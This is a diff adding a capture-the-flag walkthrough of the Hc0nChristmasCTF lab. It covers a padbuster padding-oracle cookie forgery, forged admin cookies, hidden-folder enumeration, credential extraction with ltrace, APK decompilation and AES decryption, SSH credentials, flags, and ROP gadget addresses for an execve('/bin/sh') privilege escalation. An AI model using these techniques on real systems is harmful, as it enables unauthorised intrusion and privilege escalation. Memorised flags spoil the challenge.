@@ -1,12 +1,19 @@
 ---
 layout: default
 title: Hc0nChristmasCTF
-status: incomplete
 ---
 
 ## TL;DR
 
+In this challenge we starts with `padding oracle attack` on the cookie `hcon`, and manage to login as user `administratorhc0nwithyhackme` which was found inside `/robots.txt`. There, we can find aes secret key which will be used later.
 
+Then, we decrypt the `IV` found inside `/iv.png`, using runes based on `cicada 3301`.
+
+Next step is to grab the two parts of ssh passwords located inside `/hide-folders`.
+
+Last part is to decrypt the message from port `8080`, using the `IV` and `secret key`, and then we can use the username we find and the password to login via ssh.
+
+In order to move to root, we exploit ROP chain on `hc0n`, which has SUID bit turned on.
 
 ### Recon
 
@@ -85,10 +92,14 @@ So, we can use it to forge for ourselves a cookie, let's try to forge cookie for
 padbuster http://hc0nchristmasctf.thm/ 9QKwi5AydTkgTTkyx3v2MQ6ZYlo5whlt 8 --cookies hcon=9QKwi5AydTkgTTkyx3v2MQ6ZYlo5whlt --encoding 0 -error='Invalid padding' -plaintext='user=LOL'
 ```
 
+![user=LOL](image-10.png)
+
 We made it! we can grab the cookie:
 ```bash
-
+6sdNTEISUqBCZXYr269mNQAAAAAAAAAA
 ```
+
+![send cookie LOL](image-11.png)
 
 As we can see, it did searched for user `LOL`, however, it isn't exist.
 
@@ -151,8 +162,23 @@ Oh, let's use this administrator name, to create our cookie and login as admin:
 padbuster http://hc0nchristmasctf.thm/ 9QKwi5AydTkgTTkyx3v2MQ6ZYlo5whlt 8 --cookies hcon=9QKwi5AydTkgTTkyx3v2MQ6ZYlo5whlt --encoding 0 -error='Invalid padding' -plaintext='user=administratorhc0nwithyhackme'
 ```
 
-### ...
+![admin cookie](image-12.png)
 
+We got this cookie:
+```bash
+u7oWkmr0TrKomnSFpCLrMmqypZ4zLdrKwG7XVt97a%2Bcvankk1KBpOgAAAAAAAAAA
+```
+
+and this is the page we get when using this cookie:
+
+![administrator](image-13.png)
+
+So, we got some secret key.
+```bash
+SecretKeySpec for the apk: hconkwithyhackme
+```
+
+### Find the IV derived from iv.png using cicada 3301 runes decryption
 
 We got `iv.png`, and also that "famous group 3301" can help us to solve this, and get our secret IV.
 
@@ -203,23 +229,253 @@ Now, we can try to decode
 THEIVFORINGEOAEY
 ```
 
-### ...
+### Find first part of ssh password, located at /hide-folders/1
 
-analze apk file, find cipher text, encrypt with blabla
+When we visit `/hide-folders` which was found using `ffuf`, we can see 2 folders:
 
-grab the lol.
+![/hide-folders](image-20.png)
 
+The first folder gives us `method not allowed`:
 
+![not allowed](image-21.png)
 
-After decoding, I got 
-Next, inside `
-Fuff host, exploit oracle padding attack and grab key.
-Get IV from image. Crack the secret. Add to the ssh key. login via ssh :D
+It looks very uncommon this error message, so I tried to check with http methods are allowed using `OPTIONS`:
 
-### ...
+![options](image-23.png)
 
-grab the ssh key from `/hide-folders`.
+We got the first part of the ssh password:
+```bash
+hax0r :3 you win firts part of the ssh password
+Gf7MRr55
+```
 
-### Privilege Escalation to Root
+### Find second part of ssh password inside hola, located at /hide-folders/2/hola
+
+Let's continue to `/2`. We can see the file `hola`:
+
+![hola](image-15.png)
+
+I downloaded this file, it seems to be some executable file:
+```bash
+┌──(agonen㉿kali)-[~/thm/Hc0nChristmasCTF]
+└─$ ls -la hola                                          
+-rwxrwxr-x 1 agonen agonen 8824 Jan  7 14:56 hola
+```
+
+![koko](image-7.png)
+
+I tried my luck, but it didn't work. Then, I used `ltrace` and found the username and password:
+username is `stuxnet`:
+
+![stuxnet](image-8.png)
+
+The password is `n$@#PDuliL`
+
+![n$@#PDuliL](image-9.png)
+
+Now, I tried to execute `hola` again:
+```bash
+┌──(agonen㉿kali)-[~/thm/Hc0nChristmasCTF]
+└─$ ./hola       
+Enter your username:
+stuxnet
+Enter your password:
+n$@#PDuliL
+
+Welcome, Login Success! this is a second part of ssh password
+```
+
+Alright, we seems to have the ssh password.
+Now, we need to find the username.
+
+### Decrypt encrypted aes message to find ssh username and login via ssh
+
+Let's move on to `/admin`.
+
+![apk](image-14.png)
+
+Let's download this apk file. Using the tool `apktool` we can extract this apk file:
+```bash
+apktool d app-release.apk
+```
+
+![extract apk](image-16.png)
+
+We got a lot of `smali` code, which is like assembly just for android.
+
+![smali](image-17.png)
+I want to decompile it into java, let's use this repo [https://github.com/AlexeySoshin/smali2java](https://github.com/AlexeySoshin/smali2java) 
+
+```bash
+git clone https://github.com/AlexeySoshin/smali2java.git
+cd smali2java
+go build
+```
+
+and now, we can use it to decompile:
+```bash
+┌──(agonen㉿kali)-[~/thm/Hc0nChristmasCTF/smali2java]
+└─$ ./smali2java -path_to_smali=../app-release/smali/
+```
+
+After decompling, I found inside `smali/com/example/a11x256/frida_test/my_activity.java` something to do with AES.
+```bash
+┌──(agonen㉿kali)-[~/thm/Hc0nChristmasCTF/app-release]
+└─$ grep -rain 'AES'          
+smali/com/example/a11x256/frida_test/my_activity.java:34:                        final String v6 = "AES/CBC/PKCS5PADDING"; // const-string v6, "AES/CBC/PKCS5PADDING"
+smali/com/example/a11x256/frida_test/my_activity.java:42:                        final String v9 = "AES"; // const-string v9, "AES"
+smali/com/example/a11x256/frida_test/my_activity.java:131:final String v5 = "AES/CBC/PKCS5PADDING"; // const-string v5, "AES/CBC/PKCS5PADDING"
+smali/com/example/a11x256/frida_test/my_activity.java:139:final String v8 = "AES"; // const-string v8, "AES"
+smali/com/example/a11x256/frida_test/my_activity.smali:56:    const-string v6, "AES/CBC/PKCS5PADDING"
+smali/com/example/a11x256/frida_test/my_activity.smali:74:    const-string v9, "AES"
+smali/com/example/a11x256/frida_test/my_activity.smali:211:    const-string v5, "AES/CBC/PKCS5PADDING"
+smali/com/example/a11x256/frida_test/my_activity.smali:229:    const-string v8, "AES"
+```
+
+Okay, all what is want to say to us is that on port `8080` we get some encrypted message:
+```bash
+RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w=
+```
+
+![encrypted message](image-18.png)
+
+Remember we already found secret key `hconkwithyhackme` and IV `THEIVFORINGEOAEY`, let's try to decrypt it using [https://www.devglan.com/online-tools/aes-encryption-decryption](https://www.devglan.com/online-tools/aes-encryption-decryption)
+
+![decryption](image-19.png)
+
+we got this message.
+```bash
+user ssh <3 thedarktangent
+```
+
+Remember, we already found the ssh password, now we got the credentials for ssh login
+```bash
+thedarktangent:Gf7MRr55n$@#PDuliL
+```
+
+we can login via ssh:
+```bash
+ssh thedarktangent@hc0nChristmasCTF.thm # Gf7MRr55n$@#PDuliL
+```
+
+![login](image-24.png)
+
+and grab the user flag:
+```bash
+thedarktangent@ubuntu:~$ cat user.txt 
+thm{hc0n_christmas_2019!!!}
+
+Informacion:
+
+Parte del usuario creado por César Calderón aka @_stuxnet
+Si me ves por la h-c0n nos bebemos una birra <3
+```
+
+### Privilege Escalation to Root using ROP Chain on hc0n which has SUID bit
+
+I can see on the home page the file `hcOn`, which has SUID bit and is executbale:
+
+![hc0n](image-25.png)
+
+I downloaded the file and analyze it with `checksec`:
+```bash
+┌──(agonen㉿kali)-[~/thm/Hc0nChristmasCTF]
+└─$ checksec --file hc0n 
+[*] '/home/agonen/thm/Hc0nChristmasCTF/hc0n'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+```
+
+We can see it has no PIE or canary, but `NX` is turned on, which means stack isn't executbale.
+
+Using [https://dogbolt.org/?id=539b522c-4427-48f5-834a-ebd0afa1aa23#BinaryNinja=186](https://dogbolt.org/?id=539b522c-4427-48f5-834a-ebd0afa1aa23#BinaryNinja=186) I decompiled the file, we can see that it's vulnerbale to buffer overflow:
+
+![buffer overflow](image-26.png)
+
+It crash after 56 bytes, let's start built our `ROP` chain.
+I want to execute `execve('/bin/sh', 0, 0)`.
+Taken from here [https://docs.xanhacks.xyz/pwn/buffer-overflow/20-rop-x64-execve-syscall/](https://docs.xanhacks.xyz/pwn/buffer-overflow/20-rop-x64-execve-syscall/).
+```
+rax = 0x3b      ; 'execve' syscall id, 0x3b = 59
+rdi = /bin/sh   ; Pointer to "/bin/sh" string in memory.
+rsi = 0         ; No argument
+rdx = 0         ; No argument
+
+Then, execute syscall.
+```
+
+Let's start, first, we need to find `syscall`:
+```bash
+ROPgadget --binary ./hc0n --only "syscall"
+```
+
+we got the address `0x00000000004005fa`.
+
+![syscall](image-27.png)
+
+Now, we need to find the string `/bin/sh`:
+```bash
+ROPgadget --binary ./hc0n --string "/bin/sh"   
+```
+
+we got the address `0x00000000004006f8`.
+
+![/bin/sh](image-28.png)
+
+Now, we need `pop rax`:
+```bash
+┌──(agonen㉿kali)-[~/thm/Hc0nChristmasCTF]
+└─$ ROPgadget --binary ./hc0n --only "pop|ret" | grep 'pop rax'
+0x000000000040061f : pop rax ; ret
+```
+
+Then, `pop rdi`:
+```bash
+┌──(agonen㉿kali)-[~/thm/Hc0nChristmasCTF]
+└─$ ROPgadget --binary ./hc0n --only "pop|ret" | grep 'pop rdi'
+0x0000000000400604 : pop rdi ; ret
+```
+
+Then, `pop rsi`:
+```bash
+┌──(agonen㉿kali)-[~/thm/Hc0nChristmasCTF]
+└─$ ROPgadget --binary ./hc0n --only "pop|ret" | grep 'pop rsi'
+0x000000000040060d : pop rsi ; ret
+```
+
+Then, `pop rdx`:
+```bash
+┌──(agonen㉿kali)-[~/thm/Hc0nChristmasCTF]
+└─$ ROPgadget --binary ./hc0n --only "pop|ret" | grep 'pop rdx'
+0x0000000000400616 : pop rdx ; ret
+```
+
+Now, we can build our script. Remember the value for syscall execve is 59, taken from here [https://syscalls.w3challs.com/?arch=x86_64](https://syscalls.w3challs.com/?arch=x86_64)
+
+![execve](image-29.png)
+
+This is the full script:
+```py
+{% include_relative exploit.py %}
+```
+
+we can see it works, we got shell.
+
+![root flag](image-30.png)
+
+Let's grab the root flag:
+```bash
+$ cat /root/root.txt
+thm{3xplo1t_my_m1nd}
+
+Informacion:
+
+Exploit challenge create by @d4mianwayne
+```
+
 
 
